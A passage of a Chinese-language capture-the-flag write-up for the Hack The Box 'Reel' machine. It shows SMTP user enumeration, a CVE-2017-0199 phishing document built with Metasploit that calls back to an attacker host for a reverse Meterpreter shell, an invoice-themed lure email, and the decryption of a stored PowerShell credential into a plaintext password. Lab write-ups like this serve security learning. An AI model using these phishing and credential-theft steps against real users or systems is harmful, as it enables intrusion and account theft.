class="hljs-comment"># if get error &quot;The locale specific resource for the desired message is not present&quot;, change subscriptions to Event format (won&#x27;t do any hard running command even if they already are in this format)</span><br><span class="hljs-attribute">1</span>.<br><span class="hljs-attribute">for</span> /F <span class="hljs-string">&quot;tokens=*&quot;</span> %i in (subs.txt) DO wecutil ss <span class="hljs-string">&quot;%i&quot;</span> /cf:Events<br><span class="hljs-attribute">2</span>.<br><span class="hljs-attribute">Under</span> Windows Regional Settings, <span class="hljs-literal">on</span> the Formats tab, change the format to <span class="hljs-string">&quot;English (United States)&quot;</span><br><span class="hljs-comment"># check subscriptions are being created on the source computer</span><br><span class="hljs-attribute">Event</span> Log: /Applications and Services Logs/Microsoft/Windows/Eventlog-ForwardingPlugin/Operational<br><span class="hljs-comment">#### troubleshooting WEF</span><br><span class="hljs-attribute">collector</span> server -&gt; subscription name -&gt; runtime status<br><span class="hljs-attribute">gpupdate</span> /force (force checkin, get subscriptions)<br><span class="hljs-attribute">check</span> Microsoft/Windows/Eventlog-ForwardingPlugin/Operational for errors<br></code></pre></td></tr></table></figure>
+
+<p>但是我可以利用exiftool去浏览一下它的元属性：</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">exiftool Windows<span class="hljs-string">\</span> Event<span class="hljs-string">\</span> Forwarding.docx<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">ExifTool Version Number         :</span> <span class="hljs-number">12.40</span><br><span class="hljs-attr">File Name                       :</span> <span class="hljs-string">Windows</span> <span class="hljs-string">Event</span> <span class="hljs-string">Forwarding.docx</span><br><span class="hljs-attr">Directory                       :</span> <span class="hljs-string">.</span><br><span class="hljs-attr">File Size                       :</span> <span class="hljs-number">14</span> <span class="hljs-string">KiB</span><br><span class="hljs-attr">File Modification Date/Time     :</span> <span class="hljs-number">2017</span><span class="hljs-string">:11:01</span> <span class="hljs-number">05</span><span class="hljs-string">:13:23+08:00</span><br><span class="hljs-attr">File Access Date/Time           :</span> <span class="hljs-number">2022</span><span class="hljs-string">:04:06</span> <span class="hljs-number">16</span><span class="hljs-string">:51:32+08:00</span><br><span class="hljs-attr">File Inode Change Date/Time     :</span> <span class="hljs-number">2022</span><span class="hljs-string">:04:06</span> <span class="hljs-number">16</span><span class="hljs-string">:51:32+08:00</span><br><span class="hljs-attr">File Permissions                :</span> <span class="hljs-string">-rw-r--r--</span><br><span class="hljs-attr">File Type                       :</span> <span class="hljs-string">DOCX</span><br><span class="hljs-attr">File Type Extension             :</span> <span class="hljs-string">docx</span><br><span class="hljs-attr">MIME Type                       :</span> <span class="hljs-string">application/vnd.openxmlformats-officedocument.wordprocessingml.document</span><br><span class="hljs-attr">Zip Required Version            :</span> <span class="hljs-number">20</span><br><span class="hljs-attr">Zip Bit Flag                    :</span> <span class="hljs-number">0x0006</span><br><span class="hljs-attr">Zip Compression                 :</span> <span class="hljs-string">Deflated</span><br><span class="hljs-attr">Zip Modify Date                 :</span> <span class="hljs-number">1980</span><span class="hljs-string">:01:01</span> <span class="hljs-number">00</span><span class="hljs-string">:00:00</span><br><span class="hljs-attr">Zip CRC                         :</span> <span class="hljs-number">0x82872409</span><br><span class="hljs-attr">Zip Compressed Size             :</span> <span class="hljs-number">385</span><br><span class="hljs-attr">Zip Uncompressed Size           :</span> <span class="hljs-number">1422</span><br><span class="hljs-attr">Zip File Name                   :</span> [<span class="hljs-string">Content_Types</span>]<span class="hljs-string">.xml</span><br><span class="hljs-attr">Creator                         :</span> <span class="hljs-string">nico@megabank.com</span><br><span class="hljs-attr">Revision Number                 :</span> <span class="hljs-number">4</span><br><span class="hljs-attr">Create Date                     :</span> <span class="hljs-number">2017</span><span class="hljs-string">:10:31</span> <span class="hljs-number">18</span><span class="hljs-string">:42:00Z</span><br><span class="hljs-attr">Modify Date                     :</span> <span class="hljs-number">2017</span><span class="hljs-string">:10:31</span> <span class="hljs-number">18</span><span class="hljs-string">:51:00Z</span><br><span class="hljs-attr">Template                        :</span> <span class="hljs-string">Normal.dotm</span><br><span class="hljs-attr">Total Edit Time                 :</span> <span class="hljs-number">5</span> <span class="hljs-string">minutes</span><br><span class="hljs-attr">Pages                           :</span> <span class="hljs-number">2</span><br><span class="hljs-attr">Words                           :</span> <span class="hljs-number">299</span><br><span class="hljs-attr">Characters                      :</span> <span class="hljs-number">1709</span><br><span class="hljs-attr">Application                     :</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">Office</span> <span class="hljs-string">Word</span><br><span class="hljs-attr">Doc Security                    :</span> <span class="hljs-string">None</span><br><span class="hljs-attr">Lines                           :</span> <span class="hljs-number">14</span><br><span class="hljs-attr">Paragraphs                      :</span> <span class="hljs-number">4</span><br><span class="hljs-attr">Scale Crop                      :</span> <span class="hljs-literal">No</span><br><span class="hljs-attr">Heading Pairs                   :</span> <span class="hljs-string">Title,</span> <span class="hljs-number">1</span><br><span class="hljs-attr">Titles Of Parts                 :</span> <br><span class="hljs-attr">Company                         :</span> <br><span class="hljs-attr">Links Up To Date                :</span> <span class="hljs-literal">No</span><br><span class="hljs-attr">Characters With Spaces          :</span> <span class="hljs-number">2004</span><br><span class="hljs-attr">Shared Doc                      :</span> <span class="hljs-literal">No</span><br><span class="hljs-attr">Hyperlinks Changed              :</span> <span class="hljs-literal">No</span><br><span class="hljs-attr">App Version                     :</span> <span class="hljs-number">14.0000</span><br></code></pre></td></tr></table></figure>
+
+<p>我得到了一个看起来像是邮箱地址的字符串：<strong><a href="mailto:&#x6e;&#x69;&#x63;&#x6f;&#64;&#x6d;&#101;&#103;&#x61;&#x62;&#97;&#x6e;&#107;&#x2e;&#x63;&#x6f;&#109;">&#x6e;&#x69;&#x63;&#x6f;&#64;&#x6d;&#101;&#103;&#x61;&#x62;&#97;&#x6e;&#107;&#x2e;&#x63;&#x6f;&#109;</a></strong>，其他文件没有什么有用的信息了。</p>
+<h5 id="SMTP："><a href="#SMTP：" class="headerlink" title="SMTP："></a>SMTP：</h5><p>22SSH服务端口的服务版本并没有什么现成可利用的漏洞，我不准备现在就对其进行登录凭证爆破，我准备先访问SMTP服务端口验证获取到的这个电子邮箱是否能够利用的。我可以用以下命令访问SMTP服务：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">telnet</span> <span class="hljs-number">10.10.10.77</span> <span class="hljs-number">25</span><br></code></pre></td></tr></table></figure>
+
+<p>然后我可以测试SMTP是否能正常使用，SMTP服务的命令可以去看一眼：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.ibm.com<span class="hljs-regexp">/docs/</span>en<span class="hljs-regexp">/zos/</span><span class="hljs-number">2.2</span>.<span class="hljs-number">0</span>?topic=commands-smtp<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs awk">Trying <span class="hljs-number">10.10</span>.<span class="hljs-number">10.77</span>...<br>Connected to <span class="hljs-number">10.10</span>.<span class="hljs-number">10.77</span>.<br>Escape character is <span class="hljs-string">&#x27;^]&#x27;</span>.<br><span class="hljs-number">220</span> Mail Service ready<br>HELO worldisend.com  <span class="hljs-regexp">//</span>我告诉它我是谁<br><span class="hljs-number">250</span> Hello.<br><br>MAIL FROM:worldis@end.com <span class="hljs-regexp">//</span>声明发送人邮箱地址。<br><span class="hljs-number">250</span> OK<br><br>RCPT TO:&lt;nico@megabank.com&gt; <span class="hljs-regexp">//</span>声明收件人邮箱地址。<br><span class="hljs-number">250</span> OK  <span class="hljs-regexp">//</span>如果收件人邮箱地址存在，即返回<span class="hljs-number">250</span>状态码<br><br>RCPT TO: &lt;worldisend@megabank.com&gt; <br><span class="hljs-regexp">//</span>如果目标邮箱服务器在其域内未找到符合的邮箱地址<br><span class="hljs-number">550</span> Unknown user  <span class="hljs-regexp">//</span>则返回不知道用户<span class="hljs-number">550</span>状态码<br></code></pre></td></tr></table></figure>
+
+<p>所以实战情况下可以用smtp-user-enum对其进行邮箱地址枚举，例如：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">smtp-user-<span class="hljs-keyword">enum</span> -M RCPT -U <span class="hljs-symbol">user@</span>.txt -t <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.77</span><br></code></pre></td></tr></table></figure>
+
+<p>当然Metasploit中也有对应的SMTP枚举模块，但是我因为不知名原因无法使用而这里我只需要验证<a href="mailto:&#110;&#105;&#x63;&#x6f;&#64;&#109;&#101;&#103;&#x61;&#98;&#x61;&#x6e;&#x6b;&#x2e;&#99;&#x6f;&#109;">&#110;&#105;&#x63;&#x6f;&#64;&#109;&#101;&#103;&#x61;&#98;&#x61;&#x6e;&#x6b;&#x2e;&#99;&#x6f;&#109;</a>能否正常使用即可。</p>
+<h5 id="使用-RTF-Dynamite-进行网络钓鱼："><a href="#使用-RTF-Dynamite-进行网络钓鱼：" class="headerlink" title="使用 RTF Dynamite 进行网络钓鱼："></a>使用 RTF Dynamite 进行网络钓鱼：</h5><p>在 Reel 发布时，有一个流行的 RTF 漏洞，它在广泛的攻击中非常常用，它的漏洞编号为<a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-0199">CVE-2017-0199</a> 。它将包含恶意代码的RTF文档发给目标用户，当目标打开该恶意RTF文件便会触发内部的恶意代码，恶意代码会到恶意服务器下载并执行有效载荷，致使攻击者获取当前用户的shell。Metasploit内置了该漏洞模块的应用：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">msf-pro exploit(multi/<span class="hljs-keyword">handler</span>) &gt; <span class="hljs-keyword">search</span> CVE<span class="hljs-number">-2017</span><span class="hljs-number">-0199</span><br><br>Matching Modules<br>================<br><br>   #  <span class="hljs-type">Name</span>                                        Disclosure <span class="hljs-type">Date</span>  Rank       <span class="hljs-keyword">Check</span>  Description<br>   -  <span class="hljs-comment">----                                        ---------------  ----       -----  -----------</span><br>   <span class="hljs-number">0</span>  exploit/windows/fileformat/office_word_hta  <span class="hljs-number">2017</span><span class="hljs-number">-04</span><span class="hljs-number">-14</span>       excellent  <span class="hljs-keyword">No</span>     Microsoft Office Word Malicious Hta Execution<br><br><br>Interact <span class="hljs-keyword">with</span> a module <span class="hljs-keyword">by</span> <span class="hljs-type">name</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">index</span>. <span class="hljs-keyword">For</span> example <span class="hljs-keyword">info</span> <span class="hljs-number">0</span>, use <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> use exploit/windows/fileformat/office_word_hta<br><br>msf-pro exploit(multi/<span class="hljs-keyword">handler</span>) &gt; use <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">msf-pro exploit(windows<span class="hljs-regexp">/fileformat/</span>office_word_hta) &gt; run<br>[*] Exploit running as background job <span class="hljs-number">0</span>.<br>[*] Exploit completed, but no session was created.<br><br>[*] Started reverse TCP handler on <span class="hljs-number">10.10</span>.<span class="hljs-number">16.5</span>:<span class="hljs-number">4444</span> <br>msf-pro exploit(windows<span class="hljs-regexp">/fileformat/</span>office_word_hta) &gt; [+] msf.doc stored at <span class="hljs-regexp">/root/</span>.msf4<span class="hljs-regexp">/local/m</span>sf.doc<br>[*] Using URL: http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">16.5</span>:<span class="hljs-number">8080</span>/default.hta<br>[*] Server started.<br></code></pre></td></tr></table></figure>
+
+<p>然后发送文档给目标：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">sendEmail -f worldis@end.com -t nico@megabank.com -u <span class="hljs-string">&quot;Invoice Attached&quot;</span> -m <span class="hljs-string">&quot;You are overdue payment&quot;</span> -a <span class="hljs-regexp">/root/</span>.msf4<span class="hljs-regexp">/local/m</span>sf.doc -s <span class="hljs-number">10.10</span>.<span class="hljs-number">10.77</span> -v<br></code></pre></td></tr></table></figure>
+
+<p>sendemail以下选项：</p>
+<ul>
+<li>-f- 发送人地址，可以是任何地址，只要域存在。</li>
+<li>-t- 收件人地址，<a href="mailto:&#110;&#105;&#99;&#x6f;&#64;&#x6d;&#101;&#103;&#97;&#x62;&#97;&#x6e;&#x6b;&#46;&#99;&#x6f;&#109;">&#110;&#105;&#99;&#x6f;&#64;&#x6d;&#101;&#103;&#97;&#x62;&#97;&#x6e;&#x6b;&#46;&#99;&#x6f;&#109;</a></li>
+<li>-u- 主题</li>
+<li>-m- 内容</li>
+<li>-a- 附件</li>
+<li>-s- smtp 服务器</li>
+<li>-v- 详细</li>
+</ul>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Apr</span> <span class="hljs-number">06</span> <span class="hljs-number">20</span>:<span class="hljs-number">25</span>:<span class="hljs-number">47</span> google sendEmail[<span class="hljs-number">25402</span>]: DEBUG =&gt; Connecting to <span class="hljs-number">10.10.10.77:25</span><br><span class="hljs-attribute">Apr</span> <span class="hljs-number">06</span> <span class="hljs-number">20</span>:<span class="hljs-number">25</span>:<span class="hljs-number">48</span> google sendEmail[<span class="hljs-number">25402</span>]: DEBUG =&gt; My IP address is: <span class="hljs-number">10.10.16.5</span><br><span class="hljs-attribute">Apr</span> <span class="hljs-number">06</span> <span class="hljs-number">20</span>:<span class="hljs-number">25</span>:<span class="hljs-number">48</span> google sendEmail[<span class="hljs-number">25402</span>]: SUCCESS =&gt; Received:   <span class="hljs-number">220</span> Mail Service ready<br><span class="hljs-attribute">Apr</span> <span class="hljs-number">06</span> <span class="hljs-number">20</span>:<span class="hljs-number">25</span>:<span class="hljs-number">48</span> google sendEmail[<span class="hljs-number">25402</span>]: INFO =&gt; Sending:       EHLO google<br><span class="hljs-attribute">Apr</span> <span class="hljs-number">06</span> <span class="hljs-number">20</span>:<span class="hljs-number">25</span>:<span class="hljs-number">48</span> google sendEmail[<span class="hljs-number">25402</span>]: SUCCESS =&gt; Received:   <span class="hljs-number">250</span>-REEL, <span class="hljs-number">250</span>-SIZE <span class="hljs-number">20480000</span>, <span class="hljs-number">250</span>-AUTH LOGIN PLAIN, <span class="hljs-number">250</span> HELP<br><span class="hljs-attribute">Apr</span> <span class="hljs-number">06</span> <span class="hljs-number">20</span>:<span class="hljs-number">25</span>:<span class="hljs-number">48</span> google sendEmail[<span class="hljs-number">25402</span>]: INFO =&gt; Sending:       MAIL FROM:&lt;worldis@end.com&gt;<br><span class="hljs-attribute">Apr</span> <span class="hljs-number">06</span> <span class="hljs-number">20</span>:<span class="hljs-number">25</span>:<span class="hljs-number">48</span> google sendEmail[<span class="hljs-number">25402</span>]: SUCCESS =&gt; Received:   <span class="hljs-number">250</span> OK<br><span class="hljs-attribute">Apr</span> <span class="hljs-number">06</span> <span class="hljs-number">20</span>:<span class="hljs-number">25</span>:<span class="hljs-number">48</span> google sendEmail[<span class="hljs-number">25402</span>]: INFO =&gt; Sending:       RCPT TO:&lt;nico@megabank.com&gt;<br><span class="hljs-attribute">Apr</span> <span class="hljs-number">06</span> <span class="hljs-number">20</span>:<span class="hljs-number">25</span>:<span class="hljs-number">49</span> google sendEmail[<span class="hljs-number">25402</span>]: SUCCESS =&gt; Received:   <span class="hljs-number">250</span> OK<br><span class="hljs-attribute">Apr</span> <span class="hljs-number">06</span> <span class="hljs-number">20</span>:<span class="hljs-number">25</span>:<span class="hljs-number">49</span> google sendEmail[<span class="hljs-number">25402</span>]: INFO =&gt; Sending:       DATA<br><span class="hljs-attribute">Apr</span> <span class="hljs-number">06</span> <span class="hljs-number">20</span>:<span class="hljs-number">25</span>:<span class="hljs-number">49</span> google sendEmail[<span class="hljs-number">25402</span>]: SUCCESS =&gt; Received:   <span class="hljs-number">354</span> OK, send.<br><span class="hljs-attribute">Apr</span> <span class="hljs-number">06</span> <span class="hljs-number">20</span>:<span class="hljs-number">25</span>:<span class="hljs-number">49</span> google sendEmail[<span class="hljs-number">25402</span>]: INFO =&gt; Sending message body<br><span class="hljs-attribute">Apr</span> <span class="hljs-number">06</span> <span class="hljs-number">20</span>:<span class="hljs-number">25</span>:<span class="hljs-number">49</span> google sendEmail[<span class="hljs-number">25402</span>]: Setting content-type: text/plain<br><span class="hljs-attribute">Apr</span> <span class="hljs-number">06</span> <span class="hljs-number">20</span>:<span class="hljs-number">25</span>:<span class="hljs-number">49</span> google sendEmail[<span class="hljs-number">25402</span>]: DEBUG =&gt; Sending the attachment<span class="hljs-meta"> [Invoice.rtf]</span><br><span class="hljs-attribute">Apr</span> <span class="hljs-number">06</span> <span class="hljs-number">20</span>:<span class="hljs-number">26</span>:<span class="hljs-number">01</span> google sendEmail[<span class="hljs-number">25402</span>]: SUCCESS =&gt; Received:   <span class="hljs-number">250</span> Queued (<span class="hljs-number">12</span>.<span class="hljs-number">484</span> seconds)<br><span class="hljs-attribute">Apr</span> <span class="hljs-number">06</span> <span class="hljs-number">20</span>:<span class="hljs-number">26</span>:<span class="hljs-number">01</span> google sendEmail[<span class="hljs-number">25402</span>]: Email was sent successfully!  From: &lt;worldis@end.com&gt; To: &lt;nico@megabank.com&gt; Subject:<span class="hljs-meta"> [Invoice Attached] Attachment(s): [Invoice.rtf] Server: [10.10.10.77:25]</span><br></code></pre></td></tr></table></figure>
+
+<p>过会儿便可以收到一个Meterpreter会话：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[*] Started <span class="hljs-keyword">reverse</span> TCP <span class="hljs-keyword">handler</span> <span class="hljs-keyword">on</span> <span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.5</span>:<span class="hljs-number">4444</span> <br>[*] Sending stage (<span class="hljs-number">175174</span> bytes) <span class="hljs-keyword">to</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.77</span><br>[*] Meterpreter <span class="hljs-keyword">session</span> <span class="hljs-number">1</span> opened (<span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.5</span>:<span class="hljs-number">4444</span> -&gt; <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.77</span>:<span class="hljs-number">56042</span> ) at <span class="hljs-number">2022</span><span class="hljs-number">-04</span><span class="hljs-number">-06</span> <span class="hljs-number">20</span>:<span class="hljs-number">26</span>:<span class="hljs-number">27</span> +<span class="hljs-number">0800</span><br><br>meterpreter &gt; whoami<br>[-] <span class="hljs-type">Unknown</span> command: whoami<br>meterpreter &gt; getuid<br><span class="hljs-keyword">Server</span> username: HTB\nico<br>meterpreter &gt; <br></code></pre></td></tr></table></figure>
+
+<h5 id="初始访问："><a href="#初始访问：" class="headerlink" title="初始访问："></a>初始访问：</h5><p>然后可以在C:\Users\nico\Desktop&gt;找到user.txt：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\Users\nico\Desktop&gt;dir<br><span class="hljs-attribute">dir</span><br> <span class="hljs-attribute">Volume</span> in drive C has no label.<br> <span class="hljs-attribute">Volume</span> Serial Number is CC8A-<span class="hljs-number">33</span>E1<br><br> <span class="hljs-attribute">Directory</span> of C:\Users\nico\Desktop<br><br><span class="hljs-attribute">28</span>/<span class="hljs-number">05</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">21</span>:<span class="hljs-number">07</span>    &lt;DIR&gt;          .<br><span class="hljs-attribute">28</span>/<span class="hljs-number">05</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">21</span>:<span class="hljs-number">07</span>    &lt;DIR&gt;          ..<br><span class="hljs-attribute">28</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">00</span>:<span class="hljs-number">59</span>             <span class="hljs-number">1</span>,<span class="hljs-number">468</span> cred.xml<br><span class="hljs-attribute">28</span>/<span class="hljs-number">10</span>/<span class="hljs-number">2017</span>  <span class="hljs-number">00</span>:<span class="hljs-number">40</span>                <span class="hljs-number">32</span> user.txt<br>               <span class="hljs-attribute">2</span> File(s)          <span class="hljs-number">1</span>,<span class="hljs-number">500</span> bytes<br>               <span class="hljs-attribute">2</span> Dir(s)  <span class="hljs-number">15</span>,<span class="hljs-number">768</span>,<span class="hljs-number">559</span>,<span class="hljs-number">616</span> bytes free<br><br><span class="hljs-attribute">C</span>:\Users\nico\Desktop&gt;<br></code></pre></td></tr></table></figure>
+
+<p>在nico用户桌面有一个cred.xml，我打开看了一眼，看到了其中的Password：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml">C:\Users\nico\Desktop&gt;type cred.xml<br>type cred.xml<br><span class="hljs-tag">&lt;<span class="hljs-name">Objs</span> <span class="hljs-attr">Version</span>=<span class="hljs-string">&quot;1.1.0.1&quot;</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://schemas.microsoft.com/powershell/2004/04&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Obj</span> <span class="hljs-attr">RefId</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TN</span> <span class="hljs-attr">RefId</span>=<span class="hljs-string">&quot;0&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">T</span>&gt;</span>System.Management.Automation.PSCredential<span class="hljs-tag">&lt;/<span class="hljs-name">T</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">T</span>&gt;</span>System.Object<span class="hljs-tag">&lt;/<span class="hljs-name">T</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">TN</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ToString</span>&gt;</span>System.Management.Automation.PSCredential<span class="hljs-tag">&lt;/<span class="hljs-name">ToString</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Props</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">S</span> <span class="hljs-attr">N</span>=<span class="hljs-string">&quot;UserName&quot;</span>&gt;</span>HTB\Tom<span class="hljs-tag">&lt;/<span class="hljs-name">S</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">SS</span> <span class="hljs-attr">N</span>=<span class="hljs-string">&quot;Password&quot;</span>&gt;</span>01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692<span class="hljs-tag">&lt;/<span class="hljs-name">SS</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">Props</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">Obj</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Objs</span>&gt;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>PowerShell 有一个称为 PSCredential 的对象，它提供了一种存储用户名、密码和凭据的方法。还有两个函数Import-CliXml和Export-CliXml，用于将这些凭据保存到文件并从文件中恢复它们。Export-CliXml为导出到文件，</p>
+<p>我可以通过Import-CliXml加载文件从文件中获取明文密码，然后转储结果：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">powershell</span> -c <span class="hljs-string">&quot;<span class="hljs-variable">$cred</span> = Import-CliXml -Path cred.xml; <span class="hljs-variable">$cred</span>.GetNetworkCredential() | Format-List *&quot;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nsis">C:\Users\nico\Desktop&gt;powershell -c <span class="hljs-string">&quot;<span class="hljs-variable">$cred</span> = Import-CliXml -Path cred.xml; <span class="hljs-variable">$cred.GetNetworkCredential</span>() | Format-List *&quot;</span><br>powershell -c <span class="hljs-string">&quot;<span class="hljs-variable">$cred</span> = Import-CliXml -Path cred.xml; <span class="hljs-variable">$cred.GetNetworkCredential</span>() | Format-List *&quot;</span><br><br><br>UserName       : Tom<br>Password       : <span class="hljs-number">1</span>ts-mag1c!!!<br>SecurePassword : <span class="hljs-params">System</span>.Security.SecureString<br>Domain         : HTB<br><br>C:\Users\nico\Desktop&gt;<br></code></pre></td></tr></table></figure>
+
+<p>我可以通过ssh以Tom身份进行链接获取Tom的权限：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> tom@<span class="hljs-number">10.10.10.77</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">Microsoft Windows <span class="hljs-selector-attr">[Version 6.3.9600]</span>                                                                                            <br>(c) <span class="hljs-number">2013</span> Microsoft Corporation. <span class="hljs-attribute">All</span> rights reserved.                                                                            <br><br>tom<span class="hljs-keyword">@REEL</span> <span class="hljs-attribute">C</span>:\Users\tom&gt;<br></code></pre></td></tr></table></figure>
+
+<p>在Tom桌面AD Audit目录内有note.txt：</p>
